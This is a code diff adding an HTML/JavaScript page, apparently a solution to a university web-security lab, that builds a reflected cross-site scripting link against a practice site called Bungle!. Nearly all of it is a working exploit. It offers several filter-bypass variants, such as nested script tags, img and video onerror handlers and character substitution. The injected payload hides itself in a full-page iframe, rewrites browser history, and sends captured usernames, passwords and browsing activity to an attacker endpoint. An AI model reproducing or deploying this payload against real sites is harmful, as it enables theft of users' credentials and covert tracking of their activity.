@@ -1,0 +1,119 @@
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script>
+
+function payload(attacker) {
+    var entry_flag = true;
+    function log(data) {
+        console.log($.param(data))
+        $.get(attacker, data);
+    }
+    function proxy(href) {
+        $("body").html("");
+        var iframe = $("<iframe>")
+        .css({
+            position: "absolute",
+            height: "100%",
+            width: "100%",
+            border: "none"
+        })
+        .attr("id", "aquaman")
+        .attr("src", href)
+        .appendTo("body")
+        .load(function() {
+            // loading the fake website for the first time (by clicking the trap link)
+            if(entry_flag) {
+                $("head title", window.parent.document).text("Bungle!");
+                history.replaceState({home: 0}, "home", "./");
+                entry_flag = false;
+            }
+            log({event: "nav", user: $("#aquaman").contents().find("#logged-in-user").text(), uri: "./"});
+            $("body", this.contentDocument)
+            // clicking Bungle! logo 
+            .find("a")
+            .click(function() {
+                $("head title", window.parent.document).text("Bungle!");
+                if($("#aquaman").contents().find("#logged-in-user").text()) {
+                    history.replaceState({logged_in: 1}, "logged_in", "./");
+                } else {
+                    history.replaceState({home: 0}, "home", "./");
+                }
+                log({event: "nav", user: $("#aquaman").contents().find("#logged-in-user").text(), uri: "./"});
+            })
+            .end()
+            // For each time a button is clicked, perform and log the expected action.
+            .find("form")
+            .submit(function(event) {
+                var str = $(this).serialize();
+                var u_pos1 = str.indexOf("=")+1;
+                var u_pos2 = str.indexOf("&");
+                var p_pos1 = str.lastIndexOf("=")+1;
+                var p_pos2 = str.length;
+                var user_id = str.substring(u_pos1, u_pos2);
+                var user_pw = str.substring(p_pos1, p_pos2);
+                if($(this).attr("action") == "./login") {
+                    log({event: "login", user: user_id, pass: user_pw});
+                    history.pushState({logged_in: 1}, "logged_in", "./");
+                } else if($(this).attr("action") == "./create") {
+                    log({event: "create", user: user_id, pass: user_pw});
+                    history.pushState({logged_in: 1}, "logged_in", "./");              
+                } else if($(this).attr("action") == "./logout") {
+                    $("head title", window.parent.document).text("Bungle!");
+                    log({event: "logout", user: $("#aquaman").contents().find("#logged-in-user").text()});
+                    history.pushState({home: 0}, "home", "./");
+                } else if($(this).attr("action") == "./search") {
+                    $("head title", window.parent.document).text("Search Results");
+                    var query = $("#aquaman").contents().find("#query").val();
+                    var newhref = "./search?q=" + query;
+                    log({event: "nav", user: $("#aquaman").contents().find("#logged-in-user").text(), uri: newhref});
+                    history.pushState({searched: 2}, "searched", newhref);
+                }
+            })
+            .end();
+        });
+    }
+    proxy("./");
+}
+
+function change_str(input) {
+    new_input = input.replace(/'/g, String.fromCharCode(34));
+    new_input = new_input.replace(/;/g, String.fromCharCode(59));
+    new_input = new_input.replace(/"/g, String.fromCharCode(96));
+    return new_input;
+}
+
+function makeLink(xssdefense, target, attacker) {
+    if (xssdefense == 0) {
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+            encodeURIComponent("<script" + ">" + payload.toString() +
+            ";payload(\"" + attacker + "\");</script" + ">");
+    } else if(xssdefense == 1) {
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+            encodeURIComponent("<scrscriptipt" + ">" + payload.toString() +
+            ";payload(\"" + attacker + "\");</scrscriptipt" + ">");
+    } else if(xssdefense == 2) {
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+            encodeURIComponent("<img src='#' onerror=\'" + payload.toString() +
+            ";payload(\"" + attacker + "\");\'>");
+    } else if(xssdefense == 3) {
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+            encodeURIComponent("<video src='#' onerror=\'" + payload.toString() +
+            ";payload(\"" + attacker + "\");\'>");
+    } else {
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+            encodeURIComponent(change_str("<script" + ">" + payload.toString() +
+            ";payload(\"" + attacker + "\");</script" + ">"));
+    }
+}
+
+var xssdefense = 0;
+var target = "http://trurl.cs.illinois.edu/";
+var attacker = "http://127.0.0.1:31337/stolen";
+
+$(function() {
+    var url = makeLink(xssdefense, target, attacker);
+	$("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
+});
+
+</script>
+<h3></h3>
